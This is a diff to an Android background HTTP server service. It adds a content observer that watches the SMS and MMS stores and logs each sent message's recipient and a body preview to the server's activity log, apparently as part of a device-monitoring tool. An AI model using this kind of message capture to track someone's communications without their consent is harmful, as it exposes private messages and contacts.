@@ -16,6 +16,12 @@ import androidx.core.app.NotificationCompat;
 import android.net.ConnectivityManager;
 import android.net.LinkProperties;
 import android.net.Network;
+import android.net.Uri;
+import android.database.ContentObserver;
+import android.database.Cursor;
+import android.os.Handler;
+import android.os.Looper;
+
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -38,6 +44,7 @@ public class HttpServerService extends Service {
     private ConnectivityManager.NetworkCallback networkCallback;
     private String lastReportedIp = "";
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
+    private ContentObserver messageObserver;
 
     @Override
     public void onCreate() {
@@ -45,7 +52,83 @@ public class HttpServerService extends Service {
         createNotificationChannel();
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
         registerNetworkCallback();
+        registerMessageObserver();
         checkAndReportIp(); // Initial check
+    }
+
+    private void registerMessageObserver() {
+        try {
+            messageObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
+                private long lastSmsId = -1;
+                private long lastMmsId = -1;
+
+                @Override
+                public void onChange(boolean selfChange, Uri uri) {
+                    super.onChange(selfChange, uri);
+                    networkExecutor.execute(() -> {
+                        checkNewSms();
+                        checkNewMms();
+                    });
+                }
+
+                private void checkNewSms() {
+                    Cursor cursor = null;
+                    try {
+                        // Query all SMS, sorted by date. Check if the most recent one is 'sent' (type 2)
+                        cursor = getContentResolver().query(Uri.parse("content://sms"), 
+                                new String[]{"_id", "address", "body", "type"}, null, null, "date DESC LIMIT 1");
+                        
+                        if (cursor != null && cursor.moveToFirst()) {
+                            long id = cursor.getLong(0);
+                            int type = cursor.getInt(3);
+                            if (id != lastSmsId) {
+                                if (type == 2) { // 2 = MESSAGE_TYPE_SENT
+                                    String address = cursor.getString(1);
+                                    String body = cursor.getString(2);
+                                    String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
+                                    LabRatsHttpServer.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
+                                }
+                                lastSmsId = id;
+                            }
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error checking sent SMS: " + e.getMessage());
+                    } finally {
+                        if (cursor != null) cursor.close();
+                    }
+                }
+
+                private void checkNewMms() {
+                    Cursor cursor = null;
+                    try {
+                        // msg_box 2 = SENT
+                        cursor = getContentResolver().query(Uri.parse("content://mms"), 
+                                new String[]{"_id", "msg_box"}, null, null, "date DESC LIMIT 1");
+                        
+                        if (cursor != null && cursor.moveToFirst()) {
+                            long id = cursor.getLong(0);
+                            int msgBox = cursor.getInt(1);
+                            if (id != lastMmsId) {
+                                if (msgBox == 2) {
+                                    LabRatsHttpServer.logActivity("COMMS_SENT: [MMS media dispatched]");
+                                }
+                                lastMmsId = id;
+                            }
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error checking sent MMS: " + e.getMessage());
+                    } finally {
+                        if (cursor != null) cursor.close();
+                    }
+                }
+            };
+
+            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, messageObserver);
+            getContentResolver().registerContentObserver(Uri.parse("content://mms"), true, messageObserver);
+            Log.d(TAG, "Message observer registered for bi-directional tracking");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to register message observer: " + e.getMessage());
+        }
     }
 
     @Override
@@ -158,6 +241,9 @@ public class HttpServerService extends Service {
     @Override
     public void onDestroy() {
         unregisterNetworkCallback();
+        if (messageObserver != null) {
+            getContentResolver().unregisterContentObserver(messageObserver);
+        }
         stopServer();
         networkExecutor.shutdownNow();
         super.onDestroy();
